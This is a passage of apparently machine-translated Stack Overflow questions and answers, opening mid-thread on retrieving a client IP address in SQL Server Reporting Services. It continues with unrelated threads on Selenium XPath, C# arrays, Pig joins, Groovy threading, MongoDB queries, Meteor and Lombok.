      PublicKeyBlob="0024000004800000940000000602000000240000525341310004000001000100512C8E872E28569E733BCB123794DAB55111A0570B3B3D4DE3794153DEA5EFB7C3FEA9F2D8236CFF320C4FD0EAD5F677880BF6C181F296C751C5F6E65B04D3834C02F792FEE0FE452915D44AFE74A0C27E0D8E4B8D04EC52A8E281E01FF47E7D694E6C7275A09AFCBFD8CC82705A06B20FD6EF61EBBA6873E29C8C0F2CAEDDA2"
      />
    </CodeGroup> 
    ```

    毕竟我发现它返回的是服务器 IP 地址而不是客户端！这不是[这个](http://social.msdn.microsoft.com/Forums/en-NZ/sqlreportingservices/thread/a1a1e850-ed9c-44c1-928e-b9549ad79413)或[这个](http://social.msdn.microsoft.com/Forums/en-US/sqlreportingservices/thread/ff58b2fe-5fa7-4f2b-b36d-9685fc9f74fd)说的。

2.  我尝试了不同的 ASP.net 变量，例如`HttpContext.Current.Request.ServerVariables["REMOTE_ADDR"]`which

    1.  仅在部署时有效，并在从调试器运行时抛出错误（我想这是意料之中的）和
    2.  它还只返回服务器 IP 地址！

    事实上，我编写了一个快速脚本来获取所有服务器变量并将其显示在报告屏幕上，但其中没有一个包含客户端 IP 地址！

    ```
    Public Function GetServerVariables() AS String
        Dim sReturn as String = ""

        for i as int32 = 0 to System.Web.HttpContext.Current.Request.ServerVariables.Count -1
            sReturn &=System.Web.HttpContext.Current.Request.ServerVariables.Keys(i).ToString & ": " & System.Web.HttpContext.Current.Request.ServerVariables.Item(i).ToString() & " - "
        next i

        Return sReturn
    End Function 
    ```

3.  我尝试在 vb.NET 中创建一个自定义程序集，该程序集基本上运行与上面的 GetClientIP() 函数完全相同的代码，但经过几天的尝试后，我无法使用该函数解决权限错误。我最终放弃了这一点，因为大约在同一时间，我从步骤 (1) 中获得了报告代码，并且由于它正在返回服务器 IP 地址，因此我认为自定义程序集将返回相同的内容。

因此，我们有它。对冗长的解释感到抱歉，但我想尽可能彻底。对于那些想知道为什么我需要用户 IP 地址的人来说，这实际上是另一个复杂的故事，如果有人真的想知道，我将在另一篇文章中解释。

底线是，我需要在浏览器中运行报告的计算机的 IP 地址或计算机名称。用户名或任何其他详细信息是不够的，除非它们可以用于以某种方式查找 IP 地址。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T05:16:15.363

我花了一些时间尝试返回客户端 IP，但也没有成功。但是，我想我会告诉你我做了什么，以防它对你提出了进一步的建议，或者你的环境与我的工作方式不同。我在 SharePoint 集成模式下运行。

首先，我认为我会通过将 IP 作为参数传递来绕过服务器，所以我编写了以下函数作为自定义代码：

```
Public Function GetIPAddress() As String
    Dim strHostName As String
    Dim strIPAddress As String
    strHostName = System.Net.Dns.GetHostName()
    strIPAddress = System.Net.Dns.GetHostByName(strHostName).AddressList(0).ToString()

    Return strIPAddress
End Function 
```

然后我有一个带有表达式的参数：

```
=Code.GetIPAddress() 
```

不错的理论，并且在本地工作得很好，但是当部署自定义代码时，会在服务器上进行评估，我得到了我的 Reporting Services 服务器 IP 地址，而不是我的本地 IP 地址。

因此，我尝试了带有各种变量的 HttpContext ，结果稍微好一点，但效果并不好：

```
Public Function GetClientIP() As String
    Dim IpAddress As String

    IpAddress = "UserHost: " + System.Web.HttpContext.Current.Request.UserHostAddress + " ClientIP: " + System.Web.HttpContext.Current.Request.ServerVariables("HTTP_CLIENT_IP") + " Remote: " + System.Web.HttpContext.Current.Request.ServerVariables("REMOTE_ADDR") +         " Forward: " + System.Web.HttpContext.Current.Request.ServerVariables("HTTP_X_FORWARDED_FOR")
   return IpAddress
End Function 
```

UserHostAddress 给了我 SharePoint 服务器 IP，HTTP_CLIENT_IP 为空白，REMOTE_ADDR 为 SharePoint 服务器 IP，HTTP_X_FORWARDED_FOR 为空白。

所以它可能无法完成。在任何情况下，有[一些原因可以避免在报告中使用 HttpContext，](http://blogs.msdn.com/b/jgalla/archive/2009/01/09/avoid-using-httpcontext-in-your-reports.aspx)包括它在异步线程（用于呈现报告）中以及在不使用 Http 请求执行的报告订阅中不可用。

无论如何，这就是我要解决的问题 - 祝你好运！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-02T14:04:59.197

您需要为您的程序集提供强名称和完全信任权限。

在每次调用 .net 服务之前，您必须声明所需的权限并在调用后立即恢复它。

您在 rssrvpolicy.config 文件中授予您的程序集权限。
在管理工具中，.net 配置工具用于管理代码组和权限。我建议为您的自定义程序集添加一个新的代码组和权限。

要使用您的更新，您必须停止并重新启动报告服务。

要使报告服务使用您的自定义程序集，它要求您的自定义程序集具有完全信任。一旦您设置了所有权限，您将收到错误消息，即程序集不允许部分受信任的调用者。

要解决此问题，请编辑您的 assemblyinfo.vb 文件并添加以下代码行：

程序集：AllowPartiallyTrustedCallers()

用 <...> 封装上面的代码，我删除它们是因为编辑器一直删除整行。

修复权限后，您可以使用 .net 配置工具将自定义程序集添加到程序集缓存中。请注意，每次对程序集进行更改时，都需要将 .dll 文件复制到您决定使用的目录中。从缓存中删除程序集并重新添加它。否则，您将始终调用旧版本的程序集。
当您在报表项目中时，导航到报表然后参考。您的程序集将列在可用程序集的 .net 列表中。

此外，对您对 Report_Expressions_Default_Permissions 所做的更改要非常小心。给予它完全信任可以让在你的服务器上运行的所有代码，无论是你的还是黑客的，都可以在任何报告中以任何表达式完全访问完全信任和访问。

请记住，rssrvpolicy.config 中的更改应针对报告管理器的 rsmgrpolicy.config 进行。

为自定义程序集提供所需的权限更安全。
代码看起来类似于：

```
 Dim SecurityPermission As New PermissionSet(PermissionState.Unrestricted)
    Try
        Dim SqlClientPermission As New SqlClientPermission(PermissionState.Unrestricted)

        SqlClientPermission.Assert()

        If pSqlCmd() <> vbNullString Then
            cmd = New System.Data.SqlClient.SqlCommand(pSqlCmd(), con)
        Else
            cmd = New System.Data.SqlClient.SqlCommand(sql, con)
        End If

    Catch ex As System.Data.SqlClient.SqlException
        SqlClientPermission.RevertAssert()
        SecurityPermission.Assert()
        Authorized = False
        pErrorMsg(ex.ToString())
    Catch ex As System.Security.SecurityException
        SqlClientPermission.RevertAssert()
        SecurityPermission.Assert()
        Authorized = False
        pErrorMsg(ex.ToString())
    Catch ex As Exception
        SqlClientPermission.RevertAssert()
        SecurityPermission.Assert()
        Authorized = False
        pErrorMsg(ex.ToString())
    Finally
        SqlClientPermission.RevertAssert()

    End Try

    The above code does not need SecurityPermission.   I am asserting it because the 
    exception handler assumes I do not have full access to the security system.  
    Its assumption means it gives me less information in the exception message.   By
    asserting SecurityPermission before accessing the exception message, I am able to 
    attain a full explaination of the error.   

    Note as well, that you are only allowed to make one permission assertion at a time.
    There are other methods available to add permissions to a permissionset and then
    assert that permission set.  That is why you see in the above code a RevertAssert
    to remove the current assertion before asserting another. 

   (*** There is no RevertAssert for SecurityPermission.Assert because its reverted when the 
        current routine ends ***)

    When I have time, I will write some documentation on this process.  I painfully worked 
    my way through it. 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-08T17:54:14.160

我希望有人在运行报告时给我一个更简单的解决方案来查找用户的 IP 地址，但这是*一个*可行的解决方案，我能够在几周内一起破解。

首先，我对自定义程序集或报告代码块没有运气，因为我得到的只是服务器 IP 地址而不是客户端。相反，我决定在报表管理器 aspx 页面中使用 jquery 来完成这项繁琐的工作。

以下是我可以说的最简单的步骤：

1) 在 Program Files\Microsoft SQL Server Reporting Server\MSRS10.Instancename\Reporting Services\ReportManager\Pages 目录中创建一个名为 GetClientIPAddress.aspx 的新文件。GetClientIPAddress.aspx的内容为一行，如下：

```
<%=Request.ServerVariables["REMOTE_ADDR"]%> 
```

这是实际获取客户端 IP 地址的页面。

2) 编辑同一文件夹中的 Folder.aspx 文件，并在文件底部添加此 javascript 代码：

```
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js"></script>
<script type="text/javascript">
$(document.body).ready(function () {
    try {
        var sReportName = 'Name of report here'

        $("a").each(function() {
            if (this.innerText == sReportName  || this.textContent == sReportName)
            {
                this.href = this.href.replace('Report.aspx','ReportEx.aspx');
            }
        });
    }
    catch (e) { }
});
</script> 
```

将“此处的报告名称”替换为您的报告名称。默认情况下，报告名称是报告的文件名减去扩展名。您可以在报告“属性”选项卡 >“常规”子选项卡 >“名称”字段中找到并更改此值。

3) 最后，在同一文件夹中创建一个名为 ReportEx.aspx 的新文件。此文件基于 Report.aspx 文件并使用与 Report.aspx 文件相同的标头：

```
<%@ Register TagPrefix="MSRS" Namespace="Microsoft.ReportingServices.UI" Assembly="ReportingServicesWebUserInterface" %>
<%@ Page language="c#" Codebehind="Report.aspx.cs" AutoEventWireup="false" Inherits="Microsoft.ReportingServices.UI.ReportWrapperPage" EnableEventValidation="false" %>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js"></script>
<script type="text/javascript">
function getUrlVars()
{
    var vars = [], hash;
    var hashes = window.location.href.slice(window.location.href.indexOf('?') + 1).split('&');
    for(var i = 0; i < hashes.length; i++)
    {
        hash = hashes[i].split('=');
        vars.push(hash[0]);
        vars[hash[0]] = hash[1];
    }
    return vars;
}

$(document.body).ready(function () {
    try {
        var sItemPath = getUrlVars()["ItemPath"];
        var sSelectedTab = getUrlVars()["SelectedTabId"];

        if (sSelectedTab === undefined || sSelectedTab == 'ViewTab')
        {
            $("table.msrs-normal").each(function() {
                if (this.rows.length == 2 && this.rows[0].cells.length == 1)
                {
                    var sIPAddress = $.ajax({
                        type: "GET",
                        url: 'GetClientIPAddress.aspx',
                        async: false
                    }).responseText;

                    this.rows[1].cells[0].innerHTML = '<iframe style="width: 100%; height: 100%;" frameborder="0" src="http://servername/ReportServer/Pages/ReportViewer.aspx?'+sItemPath+'&rs:Command=Render&IPAddress='+sIPAddress+'"></iframe>';
                }
            });
        }
    }
    catch (e) { }
});
</script> 
```

将“servername”替换为运行报告/sql 服务器的服务器的 IP 地址或计算机名称。

这种“黑客”通过有效拦截指向您的报告的锚标记href链接并将其替换为几乎相同的链接，该链接指向ReportEx.aspx而不是Report.aspx。在 ReportEx 页面上，对返回客户端 IP 地址的 GetClientIPAddress.aspx 页面进行了 ajax javascript 调用。该报告通过 javascript 被有效地隐藏或删除，并被替换为完全相同的报告的 iframe。唯一的区别是新报告将 ip 地址设置为查询字符串参数，这次直接将其传递到报告中。这当然需要您在报告中创建一个名为“IPAddress”的参数，以便在我们完成所有这些工作后正确地接受它！

因此，我们有它。如果有人能想到更好的方法来做到这一点，或者甚至是简化我的一些步骤的方法，我很想听听！这是在 SQL Server 2008 上完成的，我想这个解决方案可以在较早和较新的版本上工作，但可能对代码稍作改动。尽管这个解决方案是迂回的，但我提供它是希望其他人可以从我花费数小时试图找出*一种*方法，*任何*方法来做到这一点中受益！

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2014-10-20T04:59:01.200

另一个选项：启用[报表服务器 HTTP 日志](http://msdn.microsoft.com/en-us/library/bb630443.aspx)

要配置报表服务器 HTTP 日志，请使用记事本修改 ReportingServicesService.exe.config 文件。配置文件位于 \Program Files\Microsoft SQL Server\MSSQL.n\Reporting Services\ReportServer\Bin 文件夹中。要启用 HTTP 服务器，您必须将 http:4 添加到 ReportingServicesService.exe.config 文件的 RStrace 部分。所有其他 HTTP 日志文件条目都是可选的。以下示例包含所有设置，以便您可以将整个部分粘贴到 RStrace 部分上，然后删除不需要的设置。

```
 <RStrace>
     <add name="FileName" value="ReportServerService_" />
     <add name="FileSizeLimitMb" value="32" />
     <add name="KeepFilesForDays" value="14" />
     <add name="Prefix" value="tid, time" />
     <add name="TraceListeners" value="debugwindow, file" />
     <add name="TraceFileMode" value="unique" />
     <add name="HttpTraceFileName" value="ReportServerService_HTTP_" />
     <add name="HttpTraceSwitches" value="date,time,clientip,username,serverip,serverport,host,method,uristem,uriquery,protocolstatus,bytesreceived,timetaken,protocolversion,useragent,cookiereceived,cookiesent,referrer" />
     <add name="Components" value="all:3,http:4" />
   </RStrace> 
```

字段 ClientIp - 访问报表服务器的客户端的 IP 地址。请注意，HttpTraceSwitches 中的逗号后面不能有空格（否则 SSRS 会默默地忽略它）。

# javascript - 如何使用 HTML/Javascript 传递 URL 参数

> ID：13076763
> 
> 赞同：0
> 
> 时间：2012-10-25T20:30:43.403
> 
> 标签：javascript, python, html, google-app-engine, jinja2

我在 webapp 上有一个部分，用户可以在其中搜索一组位置的地图，并且一切正常，但我希望该位置的文本显示在 URL 中，以便用户可以复制并共享它将是相同的搜索。

最好的方法是什么？我可以使用 HTML 还是需要使用 Javascript？我使用 jinja2 作为模板引擎，并且我在 Python 中做后端，但这不应该有很大的影响。基本上我希望他们能够搜索“纽约市，纽约市”，并且我希望它在 URL 中显示为类似

`www.url.com/map?location=new%20york%20city%20nyc`

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-25T20:36:33.280

最简单的方法就是创建一个表单：

```
<form action="/map" method="get">
<label>Search: <input type="search" placeholder="Search" name="location"></label>
<input type="Submit">
</form> 
```

当您在输入框中输入搜索词并点击“提交”时，浏览器将发出请求`http://www.your-site.com/?q=Your%20Search%20Term`- 然后您可以从中获取参数`request`并执行您需要执行的任何操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:38:28.547

```
document.location.hash = "some/values/moreValues"; 
```

并且您可以在页面加载时解析哈希以在地图上显示您需要的内容

# java - 使用 XPath 单击超文本链接

> ID：13076765
> 
> 赞同：2
> 
> 时间：2012-10-25T20:30:46.797
> 
> 标签：java, xpath, selenium, click

如果这是一个愚蠢的问题，我深表歉意——我是 Selenium 的新手。

我有一个正在测试的网页，在表格中有几个超文本链接。HTML 如下所示：

```
<table>
  <thead>
    <tr>
      <td><b>History</b></td>
      <td><b>Attributes</b></td>
      <td><b>Xml</b></td>
    </tr>
  </thead>
  <tbody>    
    <tr>
      <td><a href=link here>Show</a></td> 
      <td><a href=link here>Show</a></td>
      <td><a href=link here>Show</a></td> 
    </tr>
  </tbody>
</table> 
```

我想测试对每个“显示”链接的点击。它们都有相同的文本，所以我无法通过链接文本引用它们。我一直通过 XPath 引用它们，因此：

```
driver.findElement(By.xpath("//div[@id='content']/div/form/div/table[2]/thead/tr/td[1]").getText() 
```

正确返回“历史”和

```
driver.findElement(By.xpath("//div[@id='content']/div/form/div/table[2]/tbody/tr/td[1]").getText() 
```

正确返回“显示”。

所以我会认为：

```
driver.findElement(By.xpath("//div[@id='content']/div/form/div/table[2]/tbody/tr/td[1]")).click() 
```

将单击第一列中的“显示”链接。但它没有 - 没有任何反应。

如果我做：

```
driver.findElement(By.linkText("Show")).click() 
```

它点击第一个“显示”链接，这是我所期望的。

我也可以这样做：

```
driver.findElement(By.xpath("//div[@id='content']/div/form/div/table[2].1.0")).click() 
```

这很有效

```
driver.findElement(By.xpath("(//a[contains(text(),'Show')])[2]")).click() 
```

所以，总而言之，所有这些工作：

```
driver.findElement(By.linkText("Show")).click()
driver.findElement(By.xpath("//div[@id='content']/div/form/div/table[2].1.0")).click()
driver.findElement(By.xpath("(//a[contains(text(),'Show')])[1]")).click() 
```

但这不是：

```
driver.findElement(By.xpath("//div[@id='content']/div/form/div/table[2]/tbody/tr/td[1]")).click() 
```

为什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T12:45:23.117

## 列表链接 = driver.findElements(By.tagName("a"));

然后遍历链接并使用 for 循环单击每个链接

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:51:01.897

您可以通过使用将所有链接收集在一起`findElements`，然后遍历数组。

例子 - `List<WebElement> inputs = driver.findElements(By.xpath("//input"));`

在你的情况下

`List<WebElement> links = driver.findElements(By.linkText("Show"));`

然后遍历`links`并单击它们中的每一个

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-26T19:49:51.723

请注意，有问题的表达式

```
driver.findElement(By.xpath("//div[@id='content']/div/form/div/table[2]/tbody/tr/td[1]")).click() 
```

选择一个`td`元素，如果没有定义链接或事件。虽然在浏览器中单击它应该会打开一个链接，但它只会发生，因为您实际上是在单击标签内的内容以及标签`td`本身。上面的代码只点击`td`，忽略它的内容。

您必须更深入地了解`a`当前选择的元素`td`。像这样：

```
driver.findElement(By.xpath("//div[@id='content']/div/form/div/table[2]/tbody/tr/td[1]/a")).click() 
```

# c# - 使用索引迭代数组并根据索引分配值

> ID：13076772
> 
> 赞同：0
> 
> 时间：2012-10-25T20:31:26.313
> 
> 标签：c#, c#-4.0, design-patterns

~~我今天早些时候遇到了[这个问题](https://stackoverflow.com/questions/13064156/displaying-a-list-of-object-containing-a-list-in-a-grid-view)，由于找不到令人满意的解决方案，我决定改变我的类设计，并具有单独的属性，例如 Tag 1、Tag 2、Tag 3 等。~~

我的主要问题是我需要将网格绑定到包含其他属性列表的对象，并且我需要将列表中的每个项目显示为单独的列，这是我无法做到的。因此，我诉诸单独声明变量。[原始问题在这里...](https://stackoverflow.com/questions/13064156/displaying-a-list-of-object-containing-a-list-in-a-grid-view)

现在，我面临着每个程序员在某个时间点可能遇到的最常见的设计问题之一。这是演示它的代码，

```
for (int i = 0; i < tags.Length; ++i) // Length not known here.
{
    if(i==0){
        tag1 = tags[0];
    } 
    else if(i == 1){
        tag2 = tags[1];
    }
    else if(i == 2){
        tag3 = tags[2];
    }
    ....
} 
```

这`tags`是一个字符串数组。

我想知道是否有更优雅的方法来做到这一点。另一件需要注意的是，这个循环的效率随着它的进行而降低，因为随着更多的迭代它必须检查更多的条件。*如果我们可以在条件变为真*后删除它，它将加快每次迭代，因为我们知道每个条件在所有迭代中只会变为*真一次*

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-25T20:35:17.790

`DataGridView`将关于和使用的答案移至`ComponentModel`正确的问题： [在网格视图中显示包含列表的对象列表](https://stackoverflow.com/questions/13064156/displaying-a-list-of-object-containing-a-list-in-a-grid-view)

**简报**

该`DataGridView`控件支持`ComponentModel`命名空间，因此您可以创建看似具有不存在的属性的类。它与`PropertyGrid`使用的机制相同。

示例代码在该问题的这个答案中： [https ://stackoverflow.com/a/13078735/195417](https://stackoverflow.com/a/13078735/195417)

**旧答案**

这是我之前的回答，当时我没有意识到真正的问题是关于`DataGridView`控制的。

* * *

这与直接设置值不一样：

```
this.tag1 = tags[0];
this.tag2 = tags[1];
this.tag3 = tags[2]; 
```

**编辑**：正如你所说，你不知道需要多少变量，那么你只需要一个，那就是一个列表：

```
var list = new List<string>();
for (int i = 0; i < tags.Length; ++i)
{
    list.add(tags[i]);
} 
```

如果您只想复制所有值，您甚至可以这样做：

```
var list = new List<string>(tags); 
```

告诉我这是否是你想要的......也许我误解了这个问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T21:05:19.453

整个循环毫无意义。但是除非标签数组的长度总是相同的，否则你必须确保不要越界......

```
if(tags.Length >= 1) this.tag1 = tags[0];
if(tags.Length >= 2) this.tag2 = tags[1];
if(tags.Length >= 3) this.tag3 = tags[2];
if(tags.Length >= 4) this.tag4 = tags[3];
if(tags.Length >= 5) this.tag5 = tags[4]; 
```

...等等，不管你有多少 this.tag#。

* * *

## 回答 #3

> 赞同：-3
> 
> 时间：2012-10-25T20:41:33.240

这本质上是相同的：

```
for(int index = 0; index < tags.Length[]; index++){
    switch(index){
        case 0:
            tag1 = tags[0];
            break;
            // And so on
    }
} 
```

# join - Pig中多个表的OUTER JOIN

> ID：13076773
> 
> 赞同：2
> 
> 时间：2012-10-25T20:31:37.150
> 
> 标签：join, outer-join, apache-pig

我需要加入多个表。我正在使用的命令如下：

```
G = JOIN aa BY f, bb by f, cc by f, dd by f; 
```

为了使它成为一个完整的外部连接，我添加了一个`FULL`来使它：

```
G = JOIN aa BY f FULL, bb by f, cc by f, dd by f; 
```

但它给了我一个`mismatched input`错误信息。我应该如何进行这项工作？

谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-25T21:56:21.960

根据 Pig[文档](http://pig.apache.org/docs/r0.10.0/basic.html#join-outer)：

> 外连接仅适用于双向连接；要执行多路外连接，您需要执行多个双向外连接语句。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-12-31T09:42:11.813

您可以使用 COGROUP 语句来模拟完全外连接。例如 cogroup 使用以下两个文件

十进制.csv

```
first|1
second|2
fourth|4 
```

罗马.csv

```
first|I 
second|II
third|III 
```

猪命令：

```
english = LOAD 'Decimal.csv' using PigStorage('|') as (name:chararray,value:chararray);
roman = LOAD 'Roman.csv' using PigStorage('|') as (name:chararray, value:chararray);
multi = cogroup english by name, roman by name;
dump multi 
```

输出：

```
(first,{(first,1)},{(first,I)})
(third,{},{(third,III)})
(fourth,{(fourth,4)},{})
(second,{(second,2)},{(second,II)}) 
```

# asp.net-mvc - 从我的 rest api 获取引用 url

> ID：13076774
> 
> 赞同：0
> 
> 时间：2012-10-25T20:31:41.743
> 
> 标签：asp.net-mvc, rest

我正在mvc中构建一个rest api。使用 API 时，我需要能够获取调用服务的引用 URL。我已经尝试过 Request.UrlReferer 并且它返回 null。如何获取使用服务的 url？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T20:50:05.370

您确定您的意思不是在消费者中您需要知道进行 REST 调用的客户端的引用者吗？

如果是这种情况，您需要做的是查看`request header`并从中提取`Referer`.

# java - 简单的 Groovy 线程管理器

> ID：13076785
> 
> 赞同：0
> 
> 时间：2012-10-25T20:32:28.497
> 
> 标签：java, multithreading, groovy, thread-safety

我用 Groovy 写了一个小线程管理器。管理器获取一个数组、一个要在数组上执行的任务以及一个块大小。然后在单独的线程中执行任务，并将结果添加到结果数组中。

这是类代码：

```
class ParallelManager {

  static def _threads = []
  static def _threadsFinishedCorrectly = []
  static  def _results = []

  static def runParallelTask( def dataArray, def taskFunc, int chunkSize ){
    assert chunkSize > 0
    assert taskFunc
    if (dataArray.size()==0) return

    assert dataArray.size() >= 0

    def subArray = partitionArray(dataArray, chunkSize)
    assert subArray.size() > 0

    subArray.each{ arrChunk->
        _threads.add( Thread.start{

            def chunkResults = taskFunc(arrChunk)
            assert chunkResults != null 
            _results.add(chunkResults) // EXCEPTION HERE
            _threadsFinishedCorrectly.add(true)
        })
    }

    // wait for all threads to finish
    _threads.each{ it.join() }
    log.info("Waiting for all threads to finish...")

    assert _threadsFinishedCorrectly.size() == _threads.size(),'some threads failed.'
    assert _results.size() == _threads.size() 
    log.info("${_threads.size()} finished.")

    return _results
}

/**
* Util function
* @param array
* @param size
* @return
*/
  static def partitionArray(array, size) {
   def partitions = []
   int partitionCount = array.size() / size

   partitionCount.times { partitionNumber ->
       def start = partitionNumber * size
       def end = start + size - 1
       partitions << array[start..end]
   }

   if (array.size() % size) partitions << array[partitionCount * size..-1]
   return partitions
} 
```

经理可以这样称呼：

```
 def parallFunc = { array->
        log.info "I'm multiplying $array by 2"
        return array.collect{it*2}
    }

  def results = ParallelManager.runParallelTask( [1,2,3,4,5,6,7,8], parallFunc, 3) 
```

此代码偶尔会在上面标记的行中引发此异常：

```
 Exception in thread "Thread-3" java.lang.ArrayIndexOutOfBoundsException: 1
 [java]     at java.util.ArrayList.add(ArrayList.java:352)
 [java]     at java_util_List$add.call(Unknown Source) 
```

你有解决这个问题的方法吗？我认为像这样的一个小线程管理器对许多人在他们的代码中加速常见任务很有用。

干杯，穆龙

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-26T08:36:01.990

这就是您使用 GPars 的方式：

```
@Grab( 'org.codehaus.gpars:gpars:0.12' )
import groovyx.gpars.*

def arr = [ 1, 2, 3, 4, 5, 6, 7, 8 ]

arr = GParsPool.withPool {
  arr.collectParallel { it * 2 }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T20:46:34.987

您听说过[gpars](http://gpars.codehaus.org)项目吗？它是一个经过验证的库，旨在使多核硬件的并发编程变得直观。它在收集处理方面非常强大。

我想建议你依赖这个库而不是实现你自己的简单线程管理器的有限版本。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-26T08:36:47.197

我使用向量而不是数组列表解决了这个问题。下面的工作代码：

```
class ParallelManager {

static def log = Logger.getLogger(ParallelManager)

Vector _threads = []
Vector _threadsFinishedCorrectly = []
Vector _results = []

/**
 * 
 * @param dataArray
 * @param chunkSize
 * @param taskFunc
 * @return
 */
def runParallelTasks( def dataArray, int chunkSize, def taskFunc ){
    reset()
    assert chunkSize > 0
    assert taskFunc
    if (dataArray.size()==0) return

    assert dataArray.size() >= 0

    def subArray = partitionArray(dataArray, chunkSize)
    assert subArray.size() > 0

    subArray.each{ arrChunk->
        _threads.add( Thread.start{

            def chunkResults = taskFunc(arrChunk)
            assert chunkResults != null 
            _results.add(chunkResults)
            _threadsFinishedCorrectly.add(true)
        })
    }

    // wait for all threads to finish
    _threads.each{ it.join() }
    log.debug("Waiting for all threads to finish...")

    assert _threadsFinishedCorrectly.size() == _threads.size(),'some threads failed.'
    assert _results.size() == _threads.size() 
    log.debug("${_threads.size()} finished.")
    def res = _results.flatten()    
    //reset()
    assert dataArray.size() == res.size(),"Something went wrong. Some threads did not return their results. results=$res" 
    return res
}

void reset(){
    _threads = []
    _results = []
    _threadsFinishedCorrectly = []
}

/**
*
* @param array
* @param size
* @return
*/
def partitionArray(array, size) {
   def partitions = []
   int partitionCount = array.size() / size

   partitionCount.times { partitionNumber ->
       def start = partitionNumber * size
       def end = start + size - 1
       partitions << array[start..end]
   }

   if (array.size() % size) partitions << array[partitionCount * size..-1]
   return partitions
  }
} 
```

经理可以这样称呼：

```
someClosure = {
    def resArray = doSomethingOn(it)
    return(resArray)
}
def resultArray = new ParallelManager().runParallelTasks( inputArray, 4, someClosure ) 
```

# node.js - Node+MongoDB：在集合中查找

> ID：13076787
> 
> 赞同：0
> 
> 时间：2012-10-25T20:32:30.947
> 
> 标签：node.js, mongodb, find

我只是不知道为什么它不起作用（（ val.instruments 未定义。

```
function getInstruments(callback) {
    db.collection("settings", function(error, settings) {
        settings.find({ "settings" : "settings" }, function (err, val) {
            console.log('from getInstruments ' + val.instruments);
            if (val.instruments==undefined) {
                callback("");
            } else {
                callback(val.instruments);
            }
        });
    });
} 
```

方案：

```
{
    "_id": {
        "$oid": "508677a3e5089a6df291631a"
    },
    "settings": "settings",
    "instruments": [
        "1",
        "2",
        "3"
    ]
} 
```

返回：

```
node app.js:
from getInstruments undefined 
```

有什么建议么？谢谢。

**UPD**：修改代码为：

```
function getInstruments(callback) {
db.collection("settings", function(error, settings) {
    settings.find({ "settings" : "settings" }).toArray(function(err, docs) {
       console.dir(docs.instruments);
    });
});
} 
```

结果：

```
[ { _id: 508677a3e5089a6df291631a,
settings: 'settings',
instruments: [ '1', '2', '3' ] } ] 
```

变成：

```
function getInstruments(callback) {
    db.collection("settings", function(error, settings) {
        settings.find({ "settings" : "settings" }).toArray(function(err, docs) {
           console.dir(docs.instruments);
        });
    });
} 
```

结果：

```
undefined 
```

怎么可能？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T20:38:16.070

find 正在返回一个数组。因此，您应该检查 val.length 是否大于 0，然后查看 val[0].instruments

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T21:02:26.837

查看文档[查找部分](https://github.com/mongodb/node-mongodb-native#find)末尾的示例。如果您`val.toArray()`在 to 的回调中运行`find`，您应该能够遍历返回的文档并一一处理它们。

# node.js - 流星阻塞澄清

> ID：13076788
> 
> 赞同：0
> 
> 时间：2012-10-25T20:32:42.250
> 
> 标签：node.js, asynchronous, meteor, blocking

根据流星文档，插入块：

> 在服务器上，如果您不提供回调，则插入块，直到数据库确认写入，或者如果出现问题则抛出异常。如果您确实提供了回调，insert 仍会立即返回 ID。

所以这是错误的：

```
Meteor.methods({
  post: function (options) {
    return Stories.insert(options)
  }
}); 
```

我需要这样做：

```
Meteor.methods({
  post: function (options) {
    return Stories.insert(options, function(){})
  }
}); 
```

有人可以确认是这种情况吗？前者会阻塞整个服务器，直到数据库返回？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-27T14:18:49.053

是的，它会阻塞，但不会阻塞整个服务器。

> 在 Meteor 中，您的服务器代码在每个请求中运行在一个线程中，而不是以 Node.js 典型的异步回调样式。我们发现线性执行模型更适合 Meteor 应用程序中的典型服务器代码。

因此，如果您担心它会像在典型 Node 中那样阻塞整个服务器，请不要担心。

# android - Android Lombok IntelliJ 集成

> ID：13076790
> 
> 赞同：2
> 
> 时间：2012-10-25T20:32:48.017
> 
> 标签：android, maven, intellij-idea, lombok

我正在尝试将 lombok 包含在我的 android 项目中，我使用 IntelliJ IDEA 作为我的 IDE。该项目是用maven构建的。我已经添加了 lombok 依赖项并使用 maven 编译项目成功。

在 IntelliJ 中，我安装了也可以使用的 lombok 插件——我看到了生成的 getter/setter。

然而，当我尝试在 IntelliJ 中制作项目时，构建失败：

> > 错误：找不到符号方法 setName(String)

在标准 Java 环境中，将 lombok 添加到类路径就足以编译项目。android环境中是什么导致编译失败？

编辑：我在 IntelliJ Bugtracker 上创建了一个问题：http: [//youtrack.jetbrains.com/issue/IDEA-94749](http://youtrack.jetbrains.com/issue/IDEA-94749)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-04T17:06:04.020

我提交了一个错误，他们在 IntelliJ **IDEA 12.1**中修复了它：http:
[//youtrack.jetbrains.com/issue/IDEA-94749](http://youtrack.jetbrains.com/issue/IDEA-94749)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-12-22T23:33:42.460

您是否尝试过启用注释处理？

进入设置->编译器->注释处理器。并确保启用了“启用注释处理”。

# android - 无法在 onCreate 语句中获得对微调器的引用

> ID：13076803
> 
> 赞同：3
> 
> 时间：2012-10-25T20:33:28.040
> 
> 标签：android, android-spinner

```
public void onCreate(Bundle savedInstanceState) {

